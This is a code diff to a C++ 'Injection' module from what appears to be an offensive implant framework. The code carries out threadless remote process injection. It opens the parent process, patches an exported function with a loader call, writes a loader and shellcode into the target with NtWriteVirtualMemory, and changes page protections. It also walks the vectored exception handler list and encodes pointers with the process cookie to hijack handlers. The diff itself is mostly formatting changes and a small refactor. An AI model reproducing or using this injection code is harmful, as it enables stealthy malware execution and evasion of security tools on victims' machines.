@@ -10,11 +10,11 @@ namespace Injection {
         // todo: needs MmPivotRegion (Flower) :
         // Proper JIT: Allocate(RW) -> memcpy(code) -> Protect(RX) -> execute [-> Free]
 
-        HANDLE process      = { };
-        UINT_PTR ex_addr    = 0;
-        UINT_PTR ex_addr_p  = 0;
-        UINT_PTR hook       = 0;
-        SIZE_T write        = 0;
+        HANDLE process = {};
+        UINT_PTR ex_addr = 0;
+        UINT_PTR ex_addr_p = 0;
+        UINT_PTR hook = 0;
+        SIZE_T write = 0;
 
         if (!(ex_addr = Memory::Modules::LoadExportAddress(threadless.Module.Buffer, threadless.Export.Buffer)) ||
             !(process = Process::OpenParentProcess(threadless.Parent.Buffer)) ||
@@ -30,12 +30,12 @@ namespace Injection {
         Memory::PatchMemory(B_PTR(threadless.Opcode.Buffer), B_PTR(&loader_rva), CALL_X_OFFSET, 0, 4);
 
         if (
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(PVOID*, &ex_addr_p), &total, PAGE_EXECUTE_READWRITE, nullptr)) ||
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(PVOID * , &ex_addr_p), &total, PAGE_EXECUTE_READWRITE, nullptr)) ||
             !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(ex_addr), R_CAST(PVOID, threadless.Opcode.Buffer), threadless.Opcode.Length, &write)) || write != threadless.Opcode.Length) {
             return_defer(ntstatus);
         }
         if (
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID*, &hook_p), &total, PAGE_READWRITE, nullptr)) ||
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID * , &hook_p), &total, PAGE_READWRITE, nullptr)) ||
             !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook), threadless.Loader.Buffer, threadless.Loader.Length, &write)) || write != threadless.Loader.Length) {
             return_defer(ntstatus);
         }
@@ -44,7 +44,7 @@ namespace Injection {
 
         if (
             !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook + threadless.Loader.Length), shellcode, n_shellcode, &write)) || write != n_shellcode ||
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID*, &hook), &n_shellcode, PAGE_EXECUTE_READ, nullptr))) {
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID * , &hook), &n_shellcode, PAGE_EXECUTE_READ, nullptr))) {
             return_defer(ntstatus);
         }
 
@@ -68,9 +68,9 @@ namespace Injection {
             }
 
             match += 0xD;
-            handlers = R_CAST(LdrpVectorHandlerList*, *R_CAST(int32_t*, match + (match + 0x3) + 0x7));
+            handlers = R_CAST(LdrpVectorHandlerList*, *R_CAST(int32_t * , match + (match + 0x3) + 0x7));
 
-            if (!NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void *, handlers->First), &handler, sizeof(void *), nullptr))) {
+            if (!NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void * , handlers->First), &handler, sizeof(void *), nullptr))) {
                 handler = 0;
                 return_defer(ntstatus);
             }
@@ -79,29 +79,19 @@ namespace Injection {
             return handler;
         }
 
-        UINT_PTR GetStackCookie() {
-            HEXANE
-            uintptr_t cookie = 0;
-
-            if (!NT_SUCCESS(Ctx->Nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr))) {
-                cookie = 0;
-            }
-
-            return cookie;
-        }
-
         UINT_PTR EncodePointer(uintptr_t handler, const bool encode) {
             HEXANE
 
             uintptr_t pointer = 0;
-            uintptr_t cookie = 0;
+            uintptr_t cookie = Memory::GetStackCookie();
 
-            if (!(cookie = GetStackCookie())) {
+            if (!cookie) {
                 return_defer(ntstatus);
+            }
 
             encode
-                ? pointer = _rotr(cookie ^ handler, cookie & 0x1F)
-                : pointer = cookie ^ _rotr(pointer, 0x20 - (cookie & 0x1F));
+            ? pointer = _rotr(cookie ^ handler, cookie & 0x1F)
+            : pointer = cookie ^ _rotr(pointer, 0x20 - (cookie & 0x1F));
 
             defer:
             return pointer;
